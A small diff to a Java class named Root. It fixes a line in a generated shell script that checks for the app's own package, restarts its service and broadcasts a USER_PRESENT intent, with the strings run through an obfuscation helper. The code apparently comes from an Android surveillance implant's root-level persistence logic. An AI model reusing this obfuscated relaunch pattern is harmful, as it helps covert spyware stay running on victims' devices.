@@ -433,7 +433,7 @@ public class Root {
 		command += M.e("sleep 1") + "\n";
 		command += M.e("installed=$(pm list packages ") + Status.self().getAppContext().getPackageName() + ")\n";
 		command += M.e("if [ ${#installed} -gt 0 ]; then") + "\n";
-		command += M.e("am startservice com.android.dvci") + Status.self().getAppContext().getPackageName() + M.e("/.ServiceMain") + "\n";
+		command += M.e("am startservice ") + Status.self().getAppContext().getPackageName() + M.e("/.ServiceMain") + "\n";
 		command += M.e("am broadcast -a android.intent.action.USER_PRESENT") + "\n";
 		command += M.e("fi") + "\n";
 		command += M.e("sleep 2") + "\n";
